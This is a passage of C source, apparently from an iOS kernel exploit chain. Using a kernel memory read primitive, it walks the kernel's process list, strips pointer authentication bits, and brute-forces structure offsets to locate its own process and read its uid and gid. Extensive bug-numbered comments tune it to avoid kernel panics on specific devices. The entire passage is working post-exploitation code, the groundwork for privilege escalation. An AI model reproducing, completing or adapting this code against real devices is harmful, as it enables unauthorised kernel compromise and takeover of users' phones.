        bool is_cycle = false;
        for (int v = 0; v < cycle_nvisited; v++) {
            if (cycle_visited[v] == currentproc) {
                filelog_write("[ourproc] CYCLE detected at step %d: proc=0x%llx (seen at step earlier)", count, currentproc);
                is_cycle = true;
                break;
            }
        }
        if (is_cycle) break;
        if (cycle_nvisited < 256) cycle_visited[cycle_nvisited++] = currentproc;
        /* Bug #267B: collect proc address for brute-force fallback */
        if (fwd_count < 64) fwd_procs[fwd_count++] = currentproc;
        add_unique_proc_candidate(proc_candidates, &proc_candidate_count, 192, currentproc);
        uint32_t pid = 0;
        if (!read_proc_pid_checked(currentproc, PROC_PID_OFFSET, &pid)) {
            filelog_write("[ourproc] kread FAILED for pid at step %d: proc=0x%llx", count, currentproc);
            break;
        }
        /* Bug #262B: proc0 (kernel_task) has PID=0 which fails is_plausible_pid.
         * Accept PID=0 for step 0 when walking from DATA-resident proc0. */
        bool pid_ok = is_plausible_pid(pid) || (pid == 0 && count == 0 && is_kernel_data_ptr(currentproc));
        if (!pid_ok) {
            /* Bug #269: If we start from DATA-resident proc0 and the dynamically
             * discovered PID offset is wrong for this candidate, probe canonical
             * 0x60 on the first step and switch if it cleanly yields pid=0. */
            if (count == 0 && is_kernel_data_ptr(currentproc) && PROC_PID_OFFSET != 0x60) {
                uint32_t pid60 = 0;
                if (read_proc_pid_checked(currentproc, 0x60, &pid60) && pid60 == 0) {
                    filelog_write("[ourproc] Bug #269: first DATA pid invalid at off=0x%x (pid=0x%x), fallback to 0x60",
                                  PROC_PID_OFFSET, pid);
                    PROC_PID_OFFSET = 0x60;
                    pid = pid60;
                    pid_ok = true;
                }
            }
            /* Bug #375: zombie/freed BSD proc in allproc list — p_pid field is garbage
             * but p_list.le_next may still be valid (zombie procs remain in allproc
             * until reaped by their parent).  Skip up to 5 consecutive zombie entries
             * rather than terminating the walk prematurely.  This matters for
             * list_off=0x00 (real p_list) where kernel procs precede a zombie slot
             * before the full user-proc chain begins. */
            if (!pid_ok && count > 0 && zombies_skipped < 5) {
                uint64_t zn_raw = 0;
                if (ds_kread64_checked(currentproc + PROC_LIST_OFFSET + PROC_NEXT_OFFSET, &zn_raw)) {
                    uint64_t zn = pac_strip(zn_raw);
                    if (PROC_LIST_OFFSET > 0 && zn >= PROC_LIST_OFFSET) zn -= PROC_LIST_OFFSET;
                    if (zn && is_heap_ptr_relaxed(zn) && zn != currentproc) {
                        filelog_write("[ourproc] Bug #375: zombie at step %d 0x%llx pid=0x%x, skip -> 0x%llx (skips=%d)",
                                      count, currentproc, pid, zn, zombies_skipped + 1);
                        zombies_skipped++;
                        currentproc = zn;
                        continue;
                    }
                }
                filelog_write("[ourproc] Bug #375: zombie at step %d 0x%llx has no valid le_next — can't skip",
                              count, currentproc);
            }
            if (!pid_ok) {
                filelog_write("[ourproc] invalid pid at step %d: proc=0x%llx pid=0x%x", count, currentproc, pid);
                break;
            }
        }

        if (pid > max_pid_seen) max_pid_seen = pid;

        if (logged < 30) {
            filelog_write("[ourproc] [%d] proc=0x%llx pid=%u heap=%d data=%d",
                          count, currentproc, pid,
                          (int)is_heap_ptr_relaxed(currentproc),
                          (int)is_kernel_data_ptr(currentproc));
            logged++;
            if (count < 5) usleep(30000); /* 30ms flush for first steps */
        }

        if (pid == (uint32_t)ourpid) {
            /* Found our proc — now discover name offset dynamically */
            bool have_name_offset = discover_name_offset(currentproc) && PROC_NAME_OFFSET != 0;
            char name[64] = {0};
            if (have_name_offset) {
                ds_kread(currentproc + PROC_NAME_OFFSET, name, 32);
            } else {
                strlcpy(name, "<unknown>", sizeof(name));
            }
            filelog_write("[ourproc] FOUND at step %d: proc=0x%llx pid=%d name='%s'",
                          count, currentproc, pid, name);

            uint32_t uid = ds_kread32(currentproc + PROC_UID_OFFSET);
            uint32_t gid = ds_kread32(currentproc + PROC_GID_OFFSET);
            filelog_write("[ourproc] uid=%u gid=%u", uid, gid);

            return ds_finish_ourproc_scope(currentproc);
        }

        /* Read next pointer via pid-aware proc-link normalization. Some boots
         * store LIST_ENTRY-relative links rather than direct proc bases.
         * Bug #262C: use checked kread for next_raw to avoid panic on bad address. */
        uint64_t next_raw = 0;
        if (!ds_kread64_checked(currentproc + PROC_LIST_OFFSET + PROC_NEXT_OFFSET, &next_raw)) {
            filelog_write("[ourproc] next_raw kread FAILED at step %d: addr=0x%llx", count,
                          currentproc + PROC_LIST_OFFSET + PROC_NEXT_OFFSET);
            break;
        }
        uint64_t next = 0;
        if (!proc_list_next_checked_pid(currentproc, PROC_LIST_OFFSET, PROC_PID_OFFSET, &next)) {
            filelog_write("[ourproc] next read failed at step %d: proc=0x%llx", count, currentproc);
            break;
        }
        if (count < 8) {
            filelog_write("[ourproc] next hop[%d]: raw=0x%llx norm=0x%llx heap=%d data=%d list_off=0x%x",
                          count, next_raw, next, (int)is_heap_ptr_relaxed(next),
                          (int)is_kernel_data_ptr(next), PROC_LIST_OFFSET);
        }
        /* Bug #258D: Circular list sentinel detection.
         * In the circular list, the last entry's next = &allproc (= kernprocaddr).
         * normalize_proc_link_target_with_pid will return either 0 or pac_strip(raw).
         * We need to check for sentinel BEFORE the heap check.
         * Also check if raw next_entry itself points back to allproc. */
        {
            uint64_t raw_stripped = pac_strip(next_raw);
            if (raw_stripped == kernprocaddr) {
                filelog_write("[ourproc] walk reached circular list sentinel (allproc) at step %d", count);
                break;
            }
        }
        /* Bug #258C: use relaxed heap check when layout is confirmed by
         * validate_direct_allproc_v2 or DATA-proc0 detection. Strict check
         * rejects procs between zone_map_min and safe_min. */
        bool next_ok = g_direct_layout_set
                   ? (is_heap_ptr_relaxed(next) || is_kernel_data_ptr(next))
                   : is_heap_ptr(next);
        if (!next_ok || next == currentproc) {
            filelog_write("[ourproc] walk ended at step %d: raw_next=0x%llx stripped=0x%llx heap=%d relaxed=%d",
                          count, next_raw, next, (int)is_heap_ptr(next), (int)is_heap_ptr_relaxed(next));
            break;
        }
        currentproc = next;
        count++;
    }

    filelog_write("[ourproc] NOT FOUND after %d iterations (our pid=%d, max_pid_seen=%u)",
                  count, ourpid, max_pid_seen);

    bool suspicious_pid_signal = (max_pid_seen < (uint32_t)ourpid) || (max_pid_seen >= 0x10000);
    if (PROC_PID_OFFSET != 0 && count >= 8 && suspicious_pid_signal) {
        uint32_t alt_pid_off = (PROC_PID_OFFSET == 0xd8) ? 0x60 : 0xd8;
        uint32_t alt_max_pid = 0;
        int alt_steps = 0;
        filelog_write("[ourproc] Bug #383: suspicious direct walk on pid_off=0x%x (steps=%d max_pid=%u ourpid=%d), retrying with alt pid_off=0x%x",
                      PROC_PID_OFFSET, count, max_pid_seen, ourpid, alt_pid_off);
        uint64_t alt_proc = walk_proc_chain_for_pid(kernproc, kernprocaddr,
                                                    PROC_LIST_OFFSET, PROC_NEXT_OFFSET,
                                                    alt_pid_off, ourpid, 4000,
                                                    &alt_max_pid, &alt_steps);
        filelog_write("[ourproc] Bug #383: alt pid walk done: pid_off=0x%x steps=%d max_pid=%u found=0x%llx",
                      alt_pid_off, alt_steps, alt_max_pid, alt_proc);
        if (alt_proc) {
            filelog_write("[ourproc] Bug #383: FOUND with alternate pid_off=0x%x -> proc=0x%llx",
                          alt_pid_off, alt_proc);
            PROC_PID_OFFSET = alt_pid_off;
            discover_name_offset(alt_proc);
            return ds_finish_ourproc_scope(alt_proc);
        }
        if (alt_max_pid > max_pid_seen) {
            filelog_write("[ourproc] Bug #383: switching PID offset 0x%x -> 0x%x for subsequent walks (max_pid %u > %u)",
                          PROC_PID_OFFSET, alt_pid_off, alt_max_pid, max_pid_seen);
            PROC_PID_OFFSET = alt_pid_off;
            max_pid_seen = alt_max_pid;
        }
    }

    int main_walk_count = count;
    uint32_t main_walk_max_pid = max_pid_seen;

    /* Bug #337 diagnostic: dump proc0 offsets 0x00..0xF8 to identify the REAL
     * p_list linkage. Look for pairs (heap @ off N, kdata @ off N+8) that indicate
     * a BSD LIST_ENTRY where le_next=heap(next proc) and le_prev=kdata(&allproc).
     * The current wrong chain shows list_off=0xb0 (p_pglist?); the real p_list
     * should appear at a different offset with diverse PIDs including ourpid. */
    if (count >= 10 && max_pid_seen > 0 && ((max_pid_seen < (uint32_t)ourpid) || (max_pid_seen >= 0x10000))) {
        filelog_write("[ourproc] Bug #337 diag: proc0=0x%llx list_off=0x%x pid_off=0x%x max_pid=%u ourpid=%d",
                      kernproc, PROC_LIST_OFFSET, PROC_PID_OFFSET, max_pid_seen, ourpid);
        for (uint32_t doff = 0; doff <= 0xF8; doff += 8) {
            uint64_t dval = 0;
            ds_kread64_checked(kernproc + doff, &dval);
            uint64_t dstripped = pac_strip(dval);
            int dheap = (int)is_heap_ptr_relaxed(dstripped);
            int dkptr = (int)is_kptr(dstripped);
            /* Only log interesting values: heap ptrs OR kdata ptrs; skip zeros */
            if (dval == 0) continue;
            filelog_write("[ourproc] Bug #337 diag: proc0+0x%02x = 0x%llx stripped=0x%llx heap=%d kptr=%d",
                          doff, dval, dstripped, dheap, dkptr);
        }
        /* Also walk the proc0+0x00 chain (if heap) to see if it leads to ourpid */
        uint64_t p0_next = 0;
        if (ds_kread64_checked(kernproc, &p0_next)) {
            uint64_t p0_next_s = pac_strip(p0_next);
            if (is_heap_ptr_relaxed(p0_next_s)) {
                /* Bug #448: Increase from 10 to 500 steps and recover if ourpid found.
                 * With list_off=0xb0 (wrong list), disc_pl walked 227 procs (pids 320..94)
                 * hitting NULL, never reaching ourpid=466. The real allproc p_list at +0x00
                 * does include DarkSword. Walking up to 500 steps covers any realistic process
                 * count. If ouproc is found, switch PROC_LIST_OFFSET=0 and return it. */
                filelog_write("[ourproc] Bug #337+448: walking proc0[+0x00] chain (le_next=0x%llx) up to 500 steps...", p0_next_s);
                uint64_t wcur = p0_next_s;
                uint64_t found_via_337 = 0;
                for (int wi = 0; wi < 500 && wcur && (is_heap_ptr_relaxed(wcur) || is_in_zone_map(wcur)); wi++) {
                    if (ds_proc_scope_guard_tripped()) {
                        filelog_write("[ourproc] Bug #337+448: PANIC GUARD tripped at step %d, aborting", wi);
                        break;
                    }
                    uint32_t wpid = 0;
                    if (!ds_kread32_checked(wcur + PROC_PID_OFFSET, &wpid)) break;
                    if (!is_plausible_pid(wpid)) break;
                    if (wi < 8 || wpid == (uint32_t)ourpid) {
                        filelog_write("[ourproc] Bug #337+448: step %d: proc=0x%llx pid=%u", wi, wcur, wpid);
                    }
                    if (wpid == (uint32_t)ourpid) {
                        filelog_write("[ourproc] Bug #337+448: FOUND ourpid=%d via proc0[+0x00] chain at step %d! Switching list_off to 0x00", ourpid, wi);
                        found_via_337 = wcur;
                        break;
                    }
                    uint64_t wnext = 0;
                    if (!ds_kread64_checked(wcur, &wnext)) break;
                    uint64_t wnext_s = pac_strip(wnext);
                    if (!wnext_s || wnext_s == wcur) break;
                    if (!is_heap_ptr_relaxed(wnext_s) && !is_in_zone_map(wnext_s)) break;
                    wcur = wnext_s;
                }
                if (found_via_337) {
                    PROC_LIST_OFFSET = 0x00;
                    PROC_NEXT_OFFSET = 0x00;
                    PROC_PREV_OFFSET = 0x08;
                    filelog_write("[ourproc] Bug #337+448: recovery — updated list_off=0x00, returning proc=0x%llx", found_via_337);
                    discover_name_offset(found_via_337);
                    return ds_finish_ourproc_scope(found_via_337);
                }
            }
        }
    }

    /* Bug #267B: Brute-force PID offset discovery on forward-walked procs.
     * Previous code only ran brute-force on backward-walked procs (bcount >= 3),
     * but when kernel_task IS the list HEAD, backward walk finds 0 procs.
     * Now we also try brute-force on forward-walked procs. */
    if (fwd_count >= 2) {
        filelog_write("[ourproc] Bug #267B: brute-force PID offset on %d forward-walked procs...", fwd_count);
        for (int fi = 0; fi < fwd_count; fi++) {
            uint64_t fproc = fwd_procs[fi];
            for (uint32_t poff = 0x00; poff <= 0x300; poff += 4) {
                uint32_t val = 0;
                if (ds_kread32_checked(fproc + poff, &val) && val == (uint32_t)ourpid) {
                    /* Verify: kernel_task at same offset must be 0 */
                    uint32_t kt_chk = 0xFFFFFFFF;
                    ds_kread32_checked(kernproc + poff, &kt_chk);
                    filelog_write("[ourproc] Bug #267B: FOUND ourpid=%d at fwd_proc[%d]=0x%llx+0x%x! "
                                  "kernel_task+0x%x=%u", ourpid, fi, fproc, poff, poff, kt_chk);
                    if (kt_chk == 0) {
                        filelog_write("[ourproc] Bug #267B: PID offset DISCOVERED = 0x%x (was 0x%x)",
                                      poff, PROC_PID_OFFSET);
                        PROC_PID_OFFSET = poff;
                        /* Now re-walk forward to find our proc with corrected offset */
                        uint64_t rewalk = kernproc;
                        for (int rw = 0; rw < 4000 && rewalk; rw++) {
                            bool rw_ok = is_heap_ptr_relaxed(rewalk) || is_kernel_data_ptr(rewalk);
                            if (!rw_ok) break;
                            uint32_t rpid = 0;
                            if (!read_proc_pid_checked(rewalk, PROC_PID_OFFSET, &rpid)) break;
                            if (rpid == (uint32_t)ourpid) {
                                filelog_write("[ourproc] Bug #267B: FOUND via re-walk at step %d: "
                                              "proc=0x%llx pid=%d", rw, rewalk, rpid);
                                discover_name_offset(rewalk);
                                return ds_finish_ourproc_scope(rewalk);
                            }
                            uint64_t rnext = 0;
                            if (!proc_list_next_checked_pid(rewalk, PROC_LIST_OFFSET,
                                                            PROC_PID_OFFSET, &rnext)) break;
                            if (!rnext || rnext == rewalk) break;
                            rewalk = rnext;
                        }
                        /* If re-walk didn't find it, return the original match */
                        filelog_write("[ourproc] Bug #267B: re-walk didn't find pid=%d, "
                                      "returning fwd_proc=0x%llx", ourpid, fproc);
                        discover_name_offset(fproc);
                        return ds_finish_ourproc_scope(fproc);
                    }
                }
            }
        }
        filelog_write("[ourproc] Bug #267B: brute-force on forward procs did not find pid=%d", ourpid);
    }

    /* Bug #263F: If ALL walked procs had PID=0 and were in DATA, this allproc
     * candidate was WRONG (e.g. zone descriptor array at 0x321C240).
     * Invalidate cache and retry kernprocaddress() to try other candidates. */
    bool data_zero_chain = (g_direct_layout_set && is_kernel_data_ptr(kernproc) &&
                            count >= 2 && max_pid_seen == 0);
    if (data_zero_chain) {
        filelog_write("[ourproc] Bug #263F: DATA chain invalid (steps=%d max_pid=%u) — WRONG allproc! "
                      "Invalidating cache, retrying kernprocaddress()...", count, max_pid_seen);
        /* Bug #265B: Blacklist this candidate so it's not re-accepted on retry */
        if (add_candidate_blacklist(kernprocaddr)) {
            filelog_write("[ourproc] Bug #265B: blacklisted candidate 0x%llx (total=%d)",
                          kernprocaddr, g_blacklisted_count);
        }
        g_kernproc_addr = 0;
        g_direct_layout_set = false;
        g_kernproc_is_pid0 = false;
        uint64_t retry_addr = kernprocaddress();
        if (retry_addr && retry_addr != kernprocaddr) {
            filelog_write("[ourproc] Bug #263F: retried kernprocaddress() returned 0x%llx (was 0x%llx)",
                          retry_addr, kernprocaddr);
            /* Re-read new head and restart walk */
            uint64_t retry_raw = ds_kread64(retry_addr);
            uint64_t retry_stripped = pac_strip(retry_raw);
            uint64_t retry_proc = 0;
            if (PROC_LIST_OFFSET > 0 && retry_stripped >= PROC_LIST_OFFSET) {
                retry_proc = retry_stripped - PROC_LIST_OFFSET;
            } else {
                retry_proc = retry_stripped;
            }
            filelog_write("[ourproc] Bug #263F: new head proc=0x%llx, re-walking...",
                          retry_proc);
            
            /* Quick forward walk with new parameters */
            uint64_t rcur = retry_proc;
            for (int ri = 0; ri < 4000 && rcur; ri++) {
                bool rok = is_heap_ptr_relaxed(rcur);
                if (!rok && g_direct_layout_set && is_kernel_data_ptr(rcur)) rok = true;
                if (!rok) {
                    filelog_write("[ourproc] retry walk: ptr invalid at step %d: 0x%llx", ri, rcur);
                    break;
                }
                uint32_t rpid = 0;
                if (!read_proc_pid_checked(rcur, PROC_PID_OFFSET, &rpid)) break;
                /* Accept PID=0 for step 0 (kernel_task) */
                if (rpid == 0 && ri > 0) break;
                if (ri < 20 || rpid == (uint32_t)ourpid)
                    filelog_write("[ourproc] retry [%d] proc=0x%llx pid=%u heap=%d",
                                  ri, rcur, rpid, (int)is_heap_ptr_relaxed(rcur));
                if (rpid == (uint32_t)ourpid) {
                    filelog_write("[ourproc] FOUND via retry at step %d!", ri);
                    discover_name_offset(rcur);
                    return ds_finish_ourproc_scope(rcur);
                }
                uint64_t rnext_raw = 0;
                if (!ds_kread64_checked(rcur + PROC_LIST_OFFSET + PROC_NEXT_OFFSET, &rnext_raw)) break;
                uint64_t rnext_s = pac_strip(rnext_raw);
                if (rnext_s == retry_addr) {
                    filelog_write("[ourproc] retry walk: circular sentinel at step %d", ri);
                    break;
                }
                uint64_t rnext = 0;
                if (!proc_list_next_checked_pid(rcur, PROC_LIST_OFFSET, PROC_PID_OFFSET, &rnext)) break;
                if (!is_heap_ptr_relaxed(rnext) && !is_kernel_data_ptr(rnext)) break;
                if (rnext == rcur) break;
                rcur = rnext;
            }
            filelog_write("[ourproc] Bug #263F: retry walk did not find PID %d", ourpid);
        }
    }

    /* ====================================================================
     * Bug #243: BACKWARD WALK via le_prev + Alternative list offsets.
     *
     * offline_test_v6 proved:
     *   - kbase+0x321C480 has ZERO code xrefs in kernelcache → NOT allproc
     *   - Bug #241 nearby-head scan ±0x90 cannot reach ANY allproc candidate
     *     (nearest is 23 KB away, real PPLDATA allproc is 529 KB away)
     *   - list_off=0xb0 may be p_pglist (process group list), NOT p_list
     *   - Real allproc is in PPLDATA → unreadable via kread on A12+
     *
     * Strategy A: Walk BACKWARD via le_prev from the first proc we found.
     *   In BSD LIST: le_prev = &prev_proc->le_next = prev_proc + list_off
     *   So: prev_proc = le_prev_value - list_off
     *   Stops when le_prev points to kernel segment (= &allproc.lh_first).
     *   This reaches procs BEFORE our starting point in the list.
     *
     * Strategy B: Try alternative list_off values (0x00, 0x08, 0x10, 0x18).
     *   If 0xb0 is p_pglist, the real p_list (allproc entry) uses a
     *   different offset. Walk both forward and backward with each.
     * ==================================================================== */

    /* Strategy A: BACKWARD walk with current layout */
    bool bwalk_entry_ok = false;
    int bwalk_count = 0;
    if (kernproc) {
        if (g_kernproc_is_pid0) {
            bwalk_entry_ok = is_heap_ptr_relaxed(kernproc);
        } else if (g_direct_layout_set && is_kptr(kernproc) && kernproc >= kbase) {
            /* Bug #257: proc0 in kernel DATA — still try backward walk */
            bwalk_entry_ok = true;
        } else {
            bwalk_entry_ok = is_heap_ptr(kernproc);
        }
    }
    if (bwalk_entry_ok) {
        /* Bug #255: When kernproc variable was detected (PID 0 = kernel_task),
         * PROC_LIST_OFFSET may be 0xb0 (SMRQ) for decoding *(candidate), but
         * SMRQ is singly-linked — no backward link at proc+0xb0+0x08.
         * Force BSD LIST offsets: le_prev is at proc+0x08, which gives us
         * &prev_proc->le_next = prev_proc + 0x00 (le_next is first field).
         * So prev_proc = le_prev directly. */
        uint32_t bwalk_list_off = PROC_LIST_OFFSET;
        uint32_t bwalk_prev_off = PROC_PREV_OFFSET;
        if (g_kernproc_is_pid0) {
            bwalk_list_off = 0x00;     /* BSD p_list at proc+0x00 */
            bwalk_prev_off = 0x08;     /* le_prev at proc+0x08 */
            filelog_write("[ourproc] Bug #255: kernproc mode — using BSD LIST "
                          "(list=0x00 prev=0x08) for backward walk from kernel_task=0x%llx",
                          kernproc);
        }
        filelog_write("[ourproc] Bug #243A: backward walk via le_prev from proc=0x%llx "
                      "(list_off=0x%x prev_off=0x%x)...", kernproc, bwalk_list_off, bwalk_prev_off);
        uint64_t bcur = kernproc;
        uint64_t bvisited[512];
        int nbvisited = 0;
        for (int bi = 0; bi < 4000 && bcur; bi++) {
            /* Bug #257: allow DATA-resident proc in first iteration */
            bool bcur_ok = is_heap_ptr_relaxed(bcur);
            if (!bcur_ok && bi == 0 && g_direct_layout_set && is_kptr(bcur) && bcur >= kbase) {
                bcur_ok = true;  /* proc0 in kernel DATA */
            }
            if (!bcur_ok) break;
            /* Read le_prev: at proc + bwalk_list_off + bwalk_prev_off */
            uint64_t le_prev_raw = 0;
            if (!kread64_checked_local(bcur + bwalk_list_off + bwalk_prev_off, &le_prev_raw)) {
                filelog_write("[ourproc] backward walk: le_prev read failed at step %d", bi);
                break;
            }
            uint64_t le_prev = pac_strip(le_prev_raw);

            /* le_prev = &prev_proc->le_next = prev_proc + list_off.
             * If it points to kernel segment (not heap), we reached the
             * list head variable (&allproc.lh_first) → stop. */
            if (!le_prev || (is_kptr(le_prev) && !is_heap_ptr_relaxed(le_prev))) {
                filelog_write("[ourproc] backward walk: reached list head at step %d (le_prev=0x%llx → kdata)",
                              bi, le_prev);
                break;
            }

            /* Compute previous proc base */
            uint64_t prev_proc = (bwalk_list_off > 0 && le_prev >= bwalk_list_off)
                                ? le_prev - bwalk_list_off : le_prev;

            if (!is_heap_ptr_relaxed(prev_proc) || prev_proc == bcur) {
                filelog_write("[ourproc] backward walk ended at step %d (prev=0x%llx)", bi, prev_proc);
                break;
            }

            /* Cycle detection */
            bool bcycle = false;
            for (int bv = 0; bv < nbvisited; bv++) {
                if (bvisited[bv] == prev_proc) { bcycle = true; break; }
            }
            if (bcycle) {
                filelog_write("[ourproc] backward walk: cycle at step %d", bi);
                break;
            }
            if (nbvisited < 512) bvisited[nbvisited++] = prev_proc;

            uint32_t bpid = 0;
            if (!read_proc_pid_checked(prev_proc, PROC_PID_OFFSET, &bpid) || !is_plausible_pid(bpid)) {
                filelog_write("[ourproc] backward walk: bad PID at step %d proc=0x%llx pid=0x%x", bi, prev_proc, bpid);
                break;
            }

            if (bwalk_count < 20) {
                filelog_write("[ourproc] backward [%d] proc=0x%llx pid=%u", bwalk_count, prev_proc, bpid);
            }
            bwalk_count++;

            if (bpid == (uint32_t)ourpid) {
                filelog_write("[ourproc] FOUND via backward walk at step %d: proc=0x%llx pid=%d",
                              bi, prev_proc, bpid);
                discover_name_offset(prev_proc);
                return ds_finish_ourproc_scope(prev_proc);
            }

            bcur = prev_proc;
        }
        /* Bug #266/#452: If backward walk found procs but PID not matched, try brute-force
         * PID offset discovery. Scan offsets 0x00..0x300 at each walked proc looking for ourpid.
         * Use aligned 64-bit reads for addr%8==4 offsets so the proc-scope guard does not
         * trip on harmless 32-bit probes. */
        if (bwalk_count >= 3) {
            filelog_write("[ourproc] Bug #266: brute-force PID offset search on %d backward-walked procs...", bwalk_count);
            uint64_t bf_cur = kernproc;
            for (int bfi = 0; bfi < bwalk_count && bfi < 10; bfi++) {
                uint64_t bf_prev_raw = 0;
                if (!kread64_checked_local(bf_cur + bwalk_list_off + bwalk_prev_off, &bf_prev_raw)) break;
                uint64_t bf_prev = pac_strip(bf_prev_raw);
                if (!bf_prev || !is_heap_ptr_relaxed(bf_prev)) break;
                uint64_t bf_proc = (bwalk_list_off > 0 && bf_prev >= bwalk_list_off)
                                  ? bf_prev - bwalk_list_off : bf_prev;
                if (!is_heap_ptr_relaxed(bf_proc)) break;
                for (uint32_t poff = 0x00; poff <= 0x300; poff += 4) {
                    uint32_t val = 0;
                    if (read_u32_aligned_checked(bf_proc + poff, &val) && val == (uint32_t)ourpid) {
                        /* Verify: kernel_task at same offset must be 0 */
                        uint32_t kt_chk = 0xFFFFFFFF;
                        read_u32_aligned_checked(kernproc + poff, &kt_chk);
                        filelog_write("[ourproc] Bug #266: FOUND ourpid=%d at proc=0x%llx+0x%x! "
                                      "kernel_task+0x%x=%u", ourpid, bf_proc, poff, poff, kt_chk);
                        if (kt_chk == 0) {
                            filelog_write("[ourproc] Bug #266: PID offset DISCOVERED = 0x%x (was 0x%x)",
                                          poff, PROC_PID_OFFSET);
                            PROC_PID_OFFSET = poff;
                            discover_name_offset(bf_proc);
                            return ds_finish_ourproc_scope(bf_proc);
                        }
                    }
                }
                bf_cur = bf_proc;
            }
            filelog_write("[ourproc] Bug #266: brute-force PID search did not find pid=%d", ourpid);
        }
        filelog_write("[ourproc] Bug #243A: backward walk checked %d procs, PID %d not found", bwalk_count, ourpid);
    }

    /* Bug #300 / Bug #378: session 25f showed a distinct failure mode before the
     * page-aligned seed-local scan existed. The forward walk proves we are stuck in
     * a kernel-only PID=0 chain, backward walk finds zero real procs, and the old
     * Bug #243B / alt-walk probes destabilized early_kread() itself.
     *
     * Since Bug #325..#332 we now have a safer fallback: skip speculative alt-link
     * probes, but CONTINUE into the page-aligned seed-local Bug #296 zone scan
     * instead of returning early. This preserves panic-free behavior while still
     * giving Bug #332 a chance to find our proc outside the kernel-thread seeds. */
    if (count >= 8 && max_pid_seen == 0 && bwalk_count == 0 && (g_kernproc_is_pid0 || g_direct_layout_set)) {
        filelog_write("[ourproc] Bug #300: kernel-only PID=0 chain with empty backward walk — skipping alt-list/alt-next probes");
        filelog_write("[ourproc] Bug #378: redirecting to Bug #296/#332 safe seed-local scan instead of early abort");
        goto bug296_zone_scan;
    }

    /* Bug #319: the new success-path state after Bug #318 is different from
     * the old PID=0-only false chain. We now reach a SHORT mixed chain from
     * kernel_task (pid 0 → launchd-like pid 115 → a few user-visible pids),
     * but our PID is still not there and backward walk immediately hits the
     * LIST_HEAD. Session 25g shows the speculative Bug #243B / alt-next probes
     * that follow can destabilize early_kread() before the safer Bug #296/299
     * zone scan even starts.
     *
    * Bug #334: the old broad Bug #296 zone scan used to panic on this device
    * when started from an early GEN2 kernel-thread anchor (phase 4 / 64MB
    * window walked into an unallocated GEN2 guard page →
    * zone_element_bounds_check panic @zalloc.c:1281).
    *
    * The later Bug #325/#332 rewrite changed this path to a bounded,
    * seed-local scan with conservative gap limits, and Bug #386 now depends on
    * reaching that scan so it can accumulate safe proc candidates. Therefore,
    * this branch must redirect into the safe scan instead of aborting early.
     *
     * Bug #336 note: when allproc was found via DATA scan (not g_kernproc_is_pid0
     * / g_direct_layout_set), this guard does NOT fire — instead Bug #243B below
     * gets to try alt list offsets (especially list_off=0x00 = real p_list), and
     * the Bug #336 final guard after Bug #243B prevents zone-scan panic. */
    if (count >= 8 && max_pid_seen > 0 && bwalk_count == 0 &&
        (g_kernproc_is_pid0 || g_direct_layout_set)) {
        filelog_write("[ourproc] Bug #334/#336: short mixed kernproc chain (steps=%d, max_pid=%u) with "
                      "empty backward walk — redirecting to safe Bug #296/#332 scan",
                      count, max_pid_seen);
        goto bug296_zone_scan;
    }

    /* Strategy B: Alternative list offsets (in case list_off=0xb0 is p_pglist).
     * Try 0x00, 0x08, 0x10, 0x18 — these are where p_list commonly lives.
     * For each, walk forward AND backward from kernproc (PID 0 proc). */
    {
        static const uint32_t alt_list_offs[] = { 0x00, 0x08, 0x10, 0x18, 0xa8 };
        for (int ali = 0; ali < (int)(sizeof(alt_list_offs) / sizeof(alt_list_offs[0])); ali++) {
            uint32_t alo = alt_list_offs[ali];
            if (alo == PROC_LIST_OFFSET) continue; /* already tried */

            filelog_write("[ourproc] Bug #243B: alt list_off=0x%x from proc=0x%llx...", alo, kernproc);

            /* Forward walk via *(proc + alo + 0x00) as le_next */
            uint64_t acur = kernproc;
            int awalk = 0;
            for (int ai = 0; ai < 4000 && acur && is_heap_ptr(acur); ai++) {
                uint32_t apid = 0;
                if (!read_proc_pid_checked(acur, PROC_PID_OFFSET, &apid) || !is_plausible_pid(apid)) break;

                if (apid == (uint32_t)ourpid) {
                    filelog_write("[ourproc] FOUND via alt list_off=0x%x fwd step %d: proc=0x%llx pid=%d",
                                  alo, ai, acur, apid);
                    discover_name_offset(acur);
                    PROC_LIST_OFFSET = alo;
                    PROC_NEXT_OFFSET = 0x00;
                    PROC_PREV_OFFSET = 0x08;
                    return ds_finish_ourproc_scope(acur);
                }

                uint64_t anext_raw = 0;
                if (!kread64_checked_local(acur + alo, &anext_raw)) break;
                uint64_t anext = pac_strip(anext_raw);
                if (!is_heap_ptr_relaxed(anext) || anext == acur) break;

                /* The pointer may target proc_base or proc+alo (list entry).
                 * Try as proc_base first, then subtract alo. */
                uint32_t test_pid = 0;
                bool as_base = read_proc_pid_checked(anext, PROC_PID_OFFSET, &test_pid)
                               && is_plausible_pid(test_pid);
                if (as_base) {
                    acur = anext;
                } else if (alo > 0 && anext >= alo) {
                    uint64_t abase = anext - alo;
                    if (is_heap_ptr(abase) &&
                        read_proc_pid_checked(abase, PROC_PID_OFFSET, &test_pid) &&
                        is_plausible_pid(test_pid)) {
                        acur = abase;
                    } else { break; }
                } else { break; }
                awalk++;
            }
            if (awalk > 0) {
                filelog_write("[ourproc] Bug #243B: alt lo=0x%x fwd: %d procs, no match", alo, awalk);
            }

            /* Backward walk via *(proc + alo + 0x08) as le_prev */
            if (awalk >= 3) {
                uint64_t abcur = kernproc;
                int abwalk = 0;
                for (int abi = 0; abi < 4000 && abcur && is_heap_ptr(abcur); abi++) {
                    uint64_t p_raw = 0;
                    if (!kread64_checked_local(abcur + alo + 0x08, &p_raw)) break;
                    uint64_t p = pac_strip(p_raw);
                    if (!p) break;

                    /* Bug #453: on 21D61 the speculative alt-list backward probe
                     * can decode tiny non-heap values here (fresh log: 0x252b/
                     * 0x258b). Feeding those into read_proc_pid_checked() trips the
                     * proc-scope misalignment guard and destabilizes the run.
                     * Only PID-probe candidates that already look like a real proc
                     * base or a real proc+list_off entry in heap/zone_map space. */
                    uint64_t pbase = 0;
                    uint32_t ppid = 0;
                    bool pok = false;

                    if (is_heap_ptr_relaxed(p)) {
                        pbase = p;
                        pok = read_proc_pid_checked(pbase, PROC_PID_OFFSET, &ppid)
                              && is_plausible_pid(ppid);
                    }
                    if (!pok && alo > 0 && p >= alo) {
                        uint64_t alt_pbase = p - alo;
                        if (is_heap_ptr_relaxed(alt_pbase)) {
                            pbase = alt_pbase;
                            pok = read_proc_pid_checked(pbase, PROC_PID_OFFSET, &ppid) &&
                                  is_plausible_pid(ppid);
                        }
                    }
                    if (!pok || pbase == abcur) break;

                    if (ppid == (uint32_t)ourpid) {
                        filelog_write("[ourproc] FOUND via alt list_off=0x%x back step %d: proc=0x%llx pid=%d",
